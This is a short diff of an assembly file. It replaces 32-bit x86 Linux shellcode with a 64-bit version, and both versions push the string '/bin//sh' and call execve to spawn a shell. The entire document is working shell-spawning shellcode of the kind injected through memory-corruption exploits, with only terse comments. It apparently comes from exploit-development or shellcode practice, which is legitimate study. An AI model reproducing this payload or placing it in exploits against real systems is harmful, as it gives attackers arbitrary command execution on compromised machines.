@@ -1,13 +1,13 @@
+global _start
 section .text
-    global _start
-
 _start:
-    xor eax, eax; safe null
-    push eax; push null byte onto stack
-    push 0x68732f2f ; push /bin//sh
-    push 0x6e69622f
-    mov ebx,esp ; set ebx to out cmd
-    mov ecx, eax; no args
-    mov edx, eax ; no args again
-    mov al, 0xb ; set sys_execve
-    int 0x80
+	xor rsi,rsi   ; set rsi to 0
+	push rsi
+	mov rdi,0x68732f2f6e69622f 
+	push rdi
+	push rsp
+	pop rdi
+	push 59 
+	pop rax
+	cdq
+	syscall
